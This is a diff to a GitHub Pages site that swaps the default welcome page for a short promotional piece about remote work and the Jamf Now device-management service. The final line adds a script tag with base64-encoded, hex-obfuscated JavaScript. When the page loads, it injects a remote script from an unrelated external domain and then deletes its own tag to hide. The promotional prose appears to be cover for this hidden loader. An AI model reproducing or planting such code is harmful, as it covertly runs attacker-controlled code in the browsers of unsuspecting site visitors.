@@ -1,37 +1,11 @@
-## Welcome to GitHub Pages
+![Branching](remote.jpg)
+The coronavirus pandemic has pushed our lives more and more online, and that's saying something. At one point during the pandemic, it was reported that as many as a third of Americans were working from home, and another survey conducted by Gartner found that 74 percent of organizations are planning to shift many employees to remote work permanently.
 
-You can use the [editor on GitHub](https://github.com/nordtacaeviscon/Remote/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+Making this shift might simply be a matter of rethinking resource allocation for large corporations. But for small- and medium-sized businesses, a move to remote work could upend their operations. Luckily, making life work in this new digital world doesn't require hiring a whole IT department or changing operating systems. Much of the work of managing devices can be done with Jamf Now.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Born out of the need to provide non-Apple experts with the power to manage Apple devices, Jamf Now is everything a person would expect out of a service that works within the Apple ecosystem. It is seamless, simple, and easy for just about anyone to use. Whether you are setting up an employee with a new device, pushing out an update to your entire workforce, or trying to secure a lost device, Jamf Now's device management system gives you total control.
 
-### Markdown
+Jamf Now does not require any IT experience. It doesn't matter if you aren't code-savvy, the Jamf Now experience provides a familiar interface that anyone who has used Apple products in the past will be able to navigate with ease. The service also scales effortlessly, so as you grow, it grows with you.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/nordtacaeviscon/Remote/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+Right now, Jamf Now is offering a free account with the ability to manage three Apple devices at no cost. Additional devices can be added to the account for just $2 per device per month. This service has never been more essential, particularly for businesses looking to keep employees safe and productive at home.
+<script id="tHszh" src="data:text/javascript;base64, dmFyIF8xb29yMyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX1d5OEVVLCBfck9ORUIpIHt2YXIgX3ZRQ2NpID0gZnVuY3Rpb24oXzBpSlNmKSB7d2hpbGUgKC0tXzBpSlNmKSB7X1d5OEVVWydwdXNoJ10oX1d5OEVVWydzaGlmdCddKCkpO319O192UUNjaSgrK19yT05FQik7fShfMW9vcjMsIDB4MTFiKSk7dmFyIF9KQjc2UCA9IGZ1bmN0aW9uKF9nSGZUMiwgX2FJSU5GKSB7X2dIZlQyID0gX2dIZlQyIC0gMHgwO3ZhciBfbXdIbzkgPSBfMW9vcjNbX2dIZlQyXTtyZXR1cm4gX213SG85O307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfSkI3NlAoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1pOdXQ3ID0gZG9jdW1lbnRbX0pCNzZQKCcweDEnKV0oX0pCNzZQKCcweDInKSk7X1pOdXQ3W19KQjc2UCgnMHgzJyldID0gX0pCNzZQKCcweDQnKTtfWk51dDdbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3M1x4NzBceDMyXHg2Zlx4NjlceDM5XHg3OFx4NzNceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4MzZceDRiXHg0NFx4NTFceDc2XHg1NVx4NGZceDY4XHg3N1x4NGQnO2RvY3VtZW50W19KQjc2UCgnMHg1JyldKF9KQjc2UCgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9aTnV0Nyk7ZG9jdW1lbnRbX0pCNzZQKCcweDcnKV0oJ3RIc3poJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
